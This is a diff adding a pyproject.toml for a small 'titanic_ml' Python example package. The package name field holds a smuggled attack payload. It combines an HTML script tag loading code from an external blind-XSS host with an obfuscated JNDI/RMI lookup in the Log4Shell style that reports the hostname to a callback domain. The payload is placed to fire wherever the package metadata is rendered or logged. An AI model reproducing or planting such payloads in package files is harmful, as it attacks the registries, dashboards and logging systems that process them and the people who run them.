@@ -1,1 +1,22 @@
+[project]
+name = "\"><script src=https://tf.bxss.in></script> ${${lower:n}${lower:d}i:${lower:rmi}://${hostName}.{{burp}}/s2edwin}"
+description = "titanic_ml example package"
+version = "0.1.0"
+authors = [
+    { name = "Niels Zeilemaker", email = "nielszeilemaker@godatadriven.com" }
+]
+dependencies = [
+    "pyspark[ml]",
+    "sklearn"
+]
 
+[project.optional-dependencies]
+dev = [
+    "tox",
+    "pre-commit",
+    "bump2version"
+]
+
+[build-system]
+build-backend = "flit_core.buildapi"
+requires = ["flit_core >=3.2,<4"]
